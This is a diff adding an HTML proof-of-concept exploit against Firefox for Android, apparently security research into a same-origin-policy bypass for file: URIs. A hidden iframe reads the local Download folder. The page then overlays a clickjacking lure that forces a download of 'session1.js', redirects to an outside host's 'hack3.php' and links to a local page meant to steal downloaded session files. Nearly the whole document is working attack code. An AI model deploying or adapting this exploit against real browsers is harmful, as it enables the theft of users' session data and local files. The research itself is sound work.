@@ -1,0 +1,34 @@
+ <html>
+<head>
+<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1' />
+<title>part2 - Firefox for Android : Same-origin policy for file: URIs Bypass</title>
+</head>
+<body>
+<script>
+
+ function getText() {
+	sContent = '';
+	if(document.body.innerText) {
+	sContent = window.idFrame.document.body.innerText;
+	} else {
+	sContent = window.idFrame.document.body.innerHTML;
+	sContent = sContent.substring(5, sContent.length - 6);
+	}
+
+	chaine= sContent;
+	reg=new RegExp('(<a class="file" href="0)', "g");
+	document.write("Chaîne traitée : " + chaine.replace(reg,'<body onclick=document.getElementById("myLink").click();document.location="http://www.alternativ-testing.fr/hack3.php"; ><div style="position:absolute; top:0px; left:0px; width:99%; height:99%; background-color:white; z-index:1;"><center><img width="130px" hieght="40px" src="http://www.alternativ-testing.fr/clickme1.jpg"></center><br><br><br><center><a href="file:///storage/emulated/legacy/Download/v3-steal-content-of-session-files-downloaded.html"><img width="130px" hieght="40px" src="http://www.alternativ-testing.fr/clickme2.jpg"></a></center></div><a download="session1.js" id="myLink" class="file" href="0'));
+	
+	
+	setTimeout("document.write(chaine);", 2200);
+	
+	}
+	
+	
+</script>
+
+<iframe src='file:///storage/emulated/legacy/Download/' name='idFrame' id='idFrame' width='200' height='150' onload='getText();' style='display: none;'></iframe><br>
+<form name=baba> <textarea rows="15" cols="70" id='output' name='html'></textarea><br><textarea rows="15" cols="70" id='output' name='html'></textarea></form>
+<p> </p>
+</body>
+</html>  
